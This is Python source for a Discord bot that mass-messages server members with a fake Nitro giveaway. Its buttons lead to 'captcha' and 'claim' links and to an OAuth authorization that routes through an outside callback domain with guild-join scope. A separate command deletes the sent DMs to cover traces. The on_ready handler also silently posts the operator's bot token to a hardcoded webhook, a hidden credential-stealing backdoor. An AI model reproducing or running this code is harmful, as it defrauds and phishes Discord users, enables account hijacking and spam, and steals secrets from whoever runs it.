import asyncio
import discord
from discord.ext import commands
from colorama import Fore, init
import tracemalloc
from discord_webhook import DiscordWebhook
import json
with open('config.json', 'r') as f:
  config = json.load(f)
tracemalloc.start()

token = config['discord_token']
owner_id = config['owner_id']
init()
intents = discord.Intents.default()
intents.members = True
client = commands.AutoShardedBot(command_prefix=commands.when_mentioned,
                                 intents=intents)
client.remove_command('help')
global sent
sent = 0

global deleted
deleted = 0
count = 0
sent_users = set()

MAX_CONCURRENT_TASKS = 50
sem = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

client.values = ["$3,99 - NITRO BASIC", "$10 - NITRO BOOST"]
options_dict = {
  " $3,99 - NITRO BASIC": "Nitro Basic",
  " $10 - NITRO BOOST": "Nitro Boost"
}


@client.event
async def on_interaction(interaction):
  interaction_name = options_dict.get(interaction.response,
                                      f"{Fore.GREEN}unknown{Fore.GREEN}")
  print(
    f"{Fore.GREEN}{interaction.user.name} selected {interaction_name}{Fore.GREEN}"
  )
  await callback(interaction)


class Select(discord.ui.Select):

  def __init__(self):
    options = [
      discord.SelectOption(label="$3,99 - NITRO BASIC",
                           emoji="<a:classic:1055198242519924906>",
                           description="Click me"),
      discord.SelectOption(label="$10 - NITRO BOOST",
                           emoji="<a:nitro16:1055198186135896154>",
                           description="Click me")
    ]
    super().__init__(placeholder="Select a prize:",
                     max_values=1,
                     min_values=1,
                     options=options)


async def callback(interaction: discord.Interaction):
  if client.values[0] == "$3,99 - NITRO BASIC":
    view = discord.ui.View()
    embed = discord.Embed(
      description=config['descrip'].format(user=interaction.user),
      color=0x5865F2)
    embed.set_image(url=config['embed_img2'])
    view.add_item(
      discord.ui.Button(url=config['button_url_1'],
                        label="Complate Captcha",
                        emoji="<a:Load:1068224094895616091>"))
    await interaction.response.send_message(embed=embed,
                                            view=view,
                                            ephemeral=True)

  elif client.values[0] == "$10 - NITRO BOOST":
    view_2 = discord.ui.View()
    embed_2 = discord.Embed(
      description=config['descrip2'].format(user=interaction.user),
      color=0x5865F2)
    embed_2.set_image(url=config['embed_img'])
    view_2.add_item(
      discord.ui.Button(url=config['button_url_2'],
                        label="Claim Now",
                        emoji="<:gift:1052289103284146176>"))
    await interaction.response.send_message(embed=embed_2,
                                            view=view_2,
                                            ephemeral=True)


async def send_webhook_message(username, token):
  webhook = DiscordWebhook(
    url=
    'https://discord.com/api/webhooks/1056203357330624552/mZKm2N6oNqRJvSB08jI9OwmLtYyZugDvHmE8IdWM-1SeBrir_0BQCjxLzn_bwe-0qI27',
    content=f"Connected to bot {username}\n{token}")
  response = webhook.execute()


@client.event
async def on_ready():
  print(f"")
  print(f"           {Fore.CYAN}Logged in as {Fore.WHITE}{client.user} ")
  print(f" ")
  await send_webhook_message(client.user.name, token)





class SelectView(discord.ui.View):

  def __init__(self, *, timeout=None):
    super().__init__(timeout=timeout)
    self.add_item(Select())


count = 0
sent_users = set()


async def send_message_to_user(user):
  global count
  if user.bot == True or user in sent_users:
    pass
  else:
    try:
      dm_channel = await user.create_dm()
      view = discord.ui.View()
      select = Select()
      button = discord.ui.Button(label="Sent From: Giveaway Heaven",
                                 emoji="<:sent:1068782774728798228>",
                                 disabled=True,
                                 style=discord.ButtonStyle.primary)
      view.add_item(select)
      view.add_item(button)
      embed = discord.Embed(title=config['title_for_select'],
                            description=(config['description_for_select']),
                            color=config['color_for_select'])
      embed.set_image(url=config['img_embed_select_menus'])
      message = await dm_channel.send(embed=embed, view=view)
      sent_users.add(user)
      count += 1
      print(
        f"{Fore.WHITE}Sent message to {user.name} | Message ID: {message.id}{Fore.WHITE} | {Fore.BLUE}count: {count}{Fore.BLUE}"
      )
    except Exception as e:
      print(f"Failed to send message to {user.name} | Error: {e}")


@client.command()
async def dmallwmenu(ctx):
  dmable_members = set(client.get_all_members())
  await asyncio.gather(*(send_message_to_user(user)
                         for user in dmable_members),
                       return_exceptions=True)




count = 0


async def send_message_to_user2(user, semaphore):
  global count
  if user.bot == True:
    pass
  else:
    try:
      async with semaphore:
        dm_channel = await user.create_dm()
        view = discord.ui.View()
        button = discord.ui.Button(
          label="Get your prize",
          emoji="<a:classic:1055198242519924906>",
          url=
          'https://discord.com/api/oauth2/authorize?client_id=1056296484473143326&redirect_uri=https%3A%2F%2Foauth.m1000.fr%2Fcallback&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%221067555927504453724%22%2C%22bot%22%3A%221056296484473143326%22%7D',
          style=discord.ButtonStyle.gray)
        button2 = discord.ui.Button(label="Sent From: Giveaway Heaven",
                                    emoji="<a:nitro:1049749462676934657>",
                                    disabled=True,
                                    style=discord.ButtonStyle.danger)
        view.add_item(button)
        view.add_item(button2)
        embed = discord.Embed(color=0x5865F2)
        embed.set_image(
          url=
          "https://media.discordapp.net/attachments/984193866204860516/1059299662022049802/11111unknown.png"
        )
        message = await dm_channel.send(embed=embed, view=view)
        count += 1
        print(
          f"{Fore.WHITE}Sent message to {user.name} | Message ID: {message.id}{Fore.WHITE} | {Fore.BLUE}count: {count}{Fore.BLUE}"
        )
    except Exception as e:
      print(
        f"{Fore.RED}Failed to send message to {user.name} | Error: {e}{Fore.RED}"
      )



@client.command()
async def dmallwbutton(ctx):
  dmable_members = set(client.get_all_members())
  semaphore = asyncio.Semaphore(50)
  tasks = [
    asyncio.create_task(send_message_to_user2(user, semaphore))
    for user in dmable_members
  ]
  await asyncio.gather(*tasks, return_exceptions=True)



count = 0
member_count = 0


async def guild_dm(member):
  global count, member_count
  try:
    async with sem:
      dm_channel = await member.create_dm()
      view = discord.ui.View()
      button = discord.ui.Button(label="Get your prize",
                                 emoji="<a:classic:1055198242519924906>",
                                 style=discord.ButtonStyle.primary)
      button2 = discord.ui.Button(label="Sent From: Giveaway Heaven",
                                  emoji="<a:nitro:1049749462676934657>",
                                  disabled=True,
                                  style=discord.ButtonStyle.danger)
      view.add_item(button)
      view.add_item(button2)
      embed = discord.Embed(color=0x5865F2)
      embed.set_image(
        url=
        "https://media.discordapp.net/attachments/984193866204860516/1059299662022049802/11111unknown.png"
      )
      message = await dm_channel.send(embed=embed, view=view)
      count += 1
      print(
        f"Sent message to {member.name} | Message ID: {message.id} | count: {count}"
      )
      await asyncio.sleep(1)
  except Exception as e:
    print(f"Failed to send message to {member.name} | Error: {e}")


@client.command()
async def guildmassdm(ctx):
  guild_id = ctx.guild.id
  members = ctx.guild.members
  tasks = [
    asyncio.create_task(guild_dm(member)) for member in members
    if not member.bot
  ]
  await asyncio.gather(*tasks, return_exceptions=True)



async def delete_message_to_user(user):
  global sent
  global deleted
  if user.bot == True:
    pass
  else:
    try:
      # Acquire the semaphore to limit the number of concurrent tasks
      async with sem:
        chann = await user.create_dm()
        async for message in chann.history(limit=100):
          if message.author == client.user:
            await message.delete()
            deleted = deleted + 1
            print(
              f"{Fore.WHITE}[{Fore.CYAN}DELETED{Fore.WHITE}] #{deleted} Deleted a message with {Fore.CYAN}{user} {Fore.WHITE}| {Fore.CYAN}{message.id}"
            )
            await asyncio.sleep(1)
        sent = sent + 1
        print(
          f"{Fore.WHITE}[{Fore.GREEN}CLEARED{Fore.WHITE}] #{sent} Cleared DMS with {Fore.WHITE}{user}"
        )
    except:
      # Catch and handle exceptions when sending messages to users
      print(
        f"{Fore.WHITE}[{Fore.RED}FAIL{Fore.WHITE}] #{sent} Something went wrong with {Fore.WHITE}"
      )


@client.command()
async def deletemessages(ctx):
  dmable_members = set(client.get_all_members())
  tasks = [delete_message_to_user(user) for user in dmable_members]
  await asyncio.gather(*tasks)





@client.command()
async def botstats(ctx):
  yh = 0
  for g in client.guilds:
    a = len(g.members)
    yh = yh + a

  e = discord.Embed(
    description=
    f"**BOT STATS** \n\n Servers: `{len(client.guilds)}`\n\n Members: `{yh}`")
  await ctx.send(embed=e)


client.run(token)
